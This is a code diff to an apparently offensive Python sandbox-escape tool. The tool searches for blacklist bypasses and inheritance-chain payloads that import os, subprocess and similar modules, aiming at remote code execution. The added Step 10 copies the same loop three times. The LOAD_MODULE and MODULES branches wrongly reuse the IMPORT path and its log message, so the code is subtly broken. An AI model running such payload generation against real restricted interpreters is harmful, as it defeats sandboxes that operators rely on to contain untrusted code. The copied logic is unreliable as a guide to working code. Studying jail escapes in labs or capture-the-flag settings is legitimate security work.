@@ -75,6 +75,9 @@ def bypassMAIN(local_scope: Dict[str, Any] = {},
     DEBUG for more details.
     '''
     global achivements, log_level_, generated_path, search_depth, tagged_scope, try_to_restore, reminder
+    useful_modules = ['os', 'subprocess', 'uuid', 'pydoc', '_posixsubprocess',
+        'multiprocessing', '__builtins__', 'codecs', 'warnings',
+        'importlib', 'weakref', 'reprlib', 'sys', 'linecache']
     log_level_ = log_level.upper()
     if log_level_ not in ['DEBUG', 'INFO', 'TESTING']:
         logger.warning('[!] Invalid log level, using INFO instead.')
@@ -318,9 +321,6 @@ Try to bypass blacklist with them. Please be paitent.', len(builtin_path))
     # Step8: Try inheritance chain
     if 'OBJECT' in tags:
         logger.info('[*] Trying to find inheritance chains.')
-        useful_modules = ['os', 'subprocess', 'uuid', 'pydoc', '_posixsubprocess',
-                'multiprocessing', '__builtins__', 'codecs', 'warnings',
-                'importlib', 'weakref', 'reprlib', 'sys']
         search = {item: [] for item in useful_modules if item not in get_module_from_tagged_scope(tagged_scope)}
         subclasses = ().__class__.__bases__[0].__subclasses__()
         subclasses_len = len(subclasses)
@@ -355,21 +355,70 @@ Try to bypass blacklist with them. Please be paitent.', len(builtin_path))
                 tag = f'MODULE_{output.__name__.upper()}'
             else:
                 tag = 'BUILTINS_SET'
+            useful_modules.remove(k)
             tagged_scope[payload] = [output, tag]
             tags.append(tag)
             generated_path[tag] = payload
             achivements[k] = [payload, payload_len]
             logger.info(f'[+] Found inheritance chain: {payload} -> {k}')
-        logger.info("[*] modules we have found:")
-        logger.info(get_module_from_tagged_scope(tagged_scope))
     else:
         logger.info('[*] No object found, skip inheritance chains.')
 
     # Step9: Try to restore __import__
     try_to_restore('import')
+    try_to_restore('load_module')
     try_to_restore('modules', sys.modules.__class__)
+    
+    # Step10: Try to import modules
+    if 'IMPORT' in tags:
+        logger.info('[*] try to import modules with IMPORT path.')
+        for i in useful_modules:
+            progress_bar(useful_modules.index(i)+1, len(useful_modules))
+            module_path = generated_path['IMPORT'] + "('" + i + "')"
+            for _ in BypassGenerator(module_path, allow_unicode_bypass=allow_unicode_bypass, local_scope=tagged_scope).generate_bypasses():
+                if not is_blacklisted(_, banned_chr, banned_ast, banned_re, max_length):
+                    result = exec_with_returns(_, original_scope)
+                    if not result is None:
+                        if result.__name__ == sys.modules[i].__name__:
+                            achivements[i] = [_, 1]
+                            tags.append(f'MODULE_{i.upper()}')
+                            generated_path[f'MODULE_{i.upper()}'] = _
+                            break
+        print()
+    if 'LOAD_MODULE' in tags:
+        logger.info('[*] try to import modules with IMPORT path.')
+        for i in useful_modules:
+            progress_bar(useful_modules.index(i)+1, len(useful_modules))
+            module_path = generated_path['IMPORT'] + "('" + i + "')"
+            for _ in BypassGenerator(module_path, allow_unicode_bypass=allow_unicode_bypass, local_scope=tagged_scope).generate_bypasses():
+                if not is_blacklisted(_, banned_chr, banned_ast, banned_re, max_length):
+                    result = exec_with_returns(_, original_scope)
+                    if not result is None:
+                        if result.__name__ == sys.modules[i].__name__:
+                            achivements[i] = [_, 1]
+                            tags.append(f'MODULE_{i.upper()}')
+                            generated_path[f'MODULE_{i.upper()}'] = _
+                            break
+        print()
+    if 'MODULES' in tags:
+        logger.info('[*] try to import modules with MODULES path.')
+        for i in useful_modules:
+            progress_bar(useful_modules.index(i)+1, len(useful_modules))
+            module_path = generated_path['IMPORT'] + "['" + i + "']"
+            for _ in BypassGenerator(module_path, allow_unicode_bypass=allow_unicode_bypass, local_scope=tagged_scope).generate_bypasses():
+                if not is_blacklisted(_, banned_chr, banned_ast, banned_re, max_length):
+                    result = exec_with_returns(_, original_scope)
+                    if not result is None:
+                        if result.__name__ == sys.modules[i].__name__:
+                            achivements[i] = [_, 1]
+                            tags.append(f'MODULE_{i.upper()}')
+                            generated_path[f'MODULE_{i.upper()}'] = _
+                            break
+        print()
+    logger.info("[*] modules we have found:")
+    logger.info(get_module_from_tagged_scope(tagged_scope))
 
-    # Step10: Try to RCE directly with builtins 
+    # Step11: Try to RCE directly with builtins 
     if 'BUILTINS_SET' in tags or 'MODULE_BUILTINS' in tags:
         logger.info('[*] try to RCE directly with builtins.')
         try_to_restore('builtins2RCEinput', end_of_prog=True)
